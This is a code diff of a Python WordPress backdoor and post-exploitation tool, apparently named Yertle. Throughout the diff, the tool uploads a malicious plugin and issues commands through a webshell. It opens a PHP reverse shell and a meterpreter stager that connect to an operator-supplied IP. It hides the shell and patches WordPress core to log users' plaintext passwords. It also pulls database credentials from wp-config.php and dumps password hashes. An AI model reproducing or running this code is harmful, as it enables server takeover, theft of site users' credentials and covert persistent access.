@@ -1,6 +1,7 @@
 import re
 import sys
 import base64
+import readline
 import requests
 import argparse
 from random import choice
@@ -9,6 +10,8 @@ __author__ = '(n00py)'
 
 
 def uploadbackdoor(host,username,password,type,verbose):
+    if host.endswith('/'):
+        host = host[:-1]
     url = host + '/wp-login.php'
     headers = {'user-agent': 'Yertle backdoor uploader',
                'Accept-Encoding' : 'none'
@@ -68,24 +71,42 @@ def commandloop(host,uploaddir):
         params = [('cmd', cmd.encode('base64'))]
         if (cmd == "quit") or (cmd == "exit"):
             sys.exit(2)
-        if cmd == "help":
-            print "Except for the commands 'help', 'exit', and 'quit' the command will be ran on the remote host"
-        if cmd == "dbcreds":
-            datacreds(host,uploaddir)
+        if cmd == "help" or cmd == "?":
+            print '''
+            Core Commands
+            =============
+
+                Command                   Description
+                -------                   -----------
+                ?                         Help menu
+                exit                      Terminate the session
+                hashdump                  Dumps all WordPress password hashes
+                help                      Help menu
+                keylogger                 Patches WordPress core to log plaintext credentials
+                keylog                    Displays keylog file
+                meterpreter               Executes a PHP meterpreter stager to connect to metasploit
+                quit                      Terminate the session
+                shell                     Sends a TCP reverse shell to a netcat listener
+                stealth                   Hides Yertle from the plugins page
+
+                '''
         if cmd == "hashdump":
             hashdump(host, uploaddir)
-        if cmd == "upgrade":
-            upgrade(host, uploaddir)
+        if cmd == "shell":
+            shell(host, uploaddir)
         if cmd == "stealth":
             stealth(host, uploaddir)
-        if cmd == "keylog":
+        if cmd == "keylogger":
             keylogger(host, uploaddir)
+        if cmd == "keylog":
+            keylog(host, uploaddir)
         if cmd == "meterpreter":
-            meterpreter(host, uploaddir, "10.0.1.4", "8888")
+            meterpreter(host, uploaddir)
         else:
             print "Sent command: " + cmd
             sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
             print sendcommand.text
+
 
 def reverseshell(host, ip, port,uploaddir):
     params = [('ip', ip), ('port', port)]
@@ -96,16 +117,10 @@ def reverseshell(host, ip, port,uploaddir):
 def datacreds(host,uploaddir):
     params = [('cmd', 'cat ../../../wp-config.php'.encode('base64'))]
     sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
-    #print sendcommand.text
-
     user =  credextract(sendcommand.text, 'DB_USER')
     password = credextract(sendcommand.text, 'DB_PASSWORD')
     host = credextract(sendcommand.text, 'DB_HOST')
     db = credextract(sendcommand.text, 'DB_NAME')
-    #print "user: " + user
-    #print "password: " + password
-    #print "host: " + host
-    #print "database: " + db
     return host, user, password, db
 
 
@@ -117,20 +132,26 @@ def credextract(list, key):
     se = s.split("'")
     return se[2]
 
-def upgrade(host,uploaddir):
+
+def shell(host,uploaddir):
     ip = raw_input('IP Address: ')
     port = raw_input('Port: ')
     params = [('cmd', ('php -r \'$sock=fsockopen("' + ip + '",' + port + ');exec("/bin/bash -i <&3 >&3 2>&3");\'').encode('base64'))]
     try:
         print "Sending reverse shell to " + ip + " port " + port
-        sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params, timeout=1)
+        requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params, timeout=1)
     except requests.exceptions.Timeout:
         pass
 
 
+def keylog(host,uploaddir):
+    params = [('cmd', ('cat passwords.txt').encode('base64'))]
+    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+    print sendcommand.text
+
 
 def stealth(host,uploaddir):
-    hide_shell = '''<?php
+    hidden_shell = '''<?php
 $command = $_GET["cmd"];
 $command = substr($command, 0, -1);
 $command = base64_decode($command);
@@ -151,15 +172,16 @@ if (class_exists('ReflectionFunction')) {
 
 ?>
 '''
-    payload = hide_shell.encode('base64')
+    payload = hidden_shell.encode('base64')
     params = [
         ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > shell.php').encode('base64'))]
-    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+    requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
 
 
-
-def meterpreter(host,uploaddir,ip,port):
-    code = '''<?php
+def meterpreter(host,uploaddir):
+    ip = raw_input('IP Address: ')
+    port = raw_input('Port: ')
+    meter = '''<?php
 error_reporting(0);
 $ip   = '%s';
 $port = %s;
@@ -212,14 +234,14 @@ eval($b);
 die();
 ?>
 ''' % (ip, port)
-    payload = code.encode('base64')
+    payload = meter.encode('base64')
     params = [
         ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > meterpreter.php').encode('base64'))]
     sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
     params = [
         ('cmd', 'php meterpreter.php'.encode('base64'))]
     try:
-        print "Executing meterpreter stager to connect to " + ip + ":" + port
+        print "Sending meterpreter stager to connect back to " + ip + ":" + port
         sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params, timeout=1)
     except requests.exceptions.Timeout:
         pass
@@ -228,14 +250,13 @@ die();
 
 def keylogger(host,uploaddir):
 
-    doop = '''$credentials['remember'] = false;
+    hook = '''$credentials['remember'] = false;
      $file = 'wp-content/plugins/%s/passwords.txt';
      $credz = date('Y-m-d') . " - Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'] . "\n";
      file_put_contents($file, $credz, FILE_APPEND | LOCK_EX);''' % (uploaddir)
 
-    payloaddoop = doop.encode('base64')
-    print payloaddoop
-    evilcode = '''<?php
+    hook = hook.encode('base64')
+    injector = '''<?php
 $real = "JGNyZWRlbnRpYWxzWydyZW1lbWJlciddID0gZmFsc2U7";
 $evil = "%s";
 $real = base64_decode($real);
@@ -244,9 +265,8 @@ $evil = base64_decode($evil);
 $orig=file_get_contents('../../../wp-includes/user.php');
 $orig=str_replace("$real", "$evil",$orig);
 file_put_contents('../../../wp-includes/user.php', $orig);
-?>''' % payloaddoop
-    print evilcode
-    payload = evilcode.encode('base64')
+?>''' % hook
+    payload = injector.encode('base64')
     params = [
         ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > backdoor.php').encode('base64'))]
     sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
@@ -255,9 +275,10 @@ file_put_contents('../../../wp-includes/user.php', $orig);
     sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
     print sendcommand.text
 
+
 def hashdump(host,uploaddir):
     items = datacreds(host, uploaddir)
-    dumpfile = '''<?php
+    dumper = '''<?php
 $servername = "%s";
 $username = "%s";
 $password = "%s";
@@ -283,7 +304,7 @@ if ($result->num_rows > 0) {
 }
 $conn->close();
 ?> ''' % (items[0], items[1], items[2], items[3])
-    payload = dumpfile.encode('base64')
+    payload = dumper.encode('base64')
 
     params = [
     ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > hashdump.php').encode('base64'))]
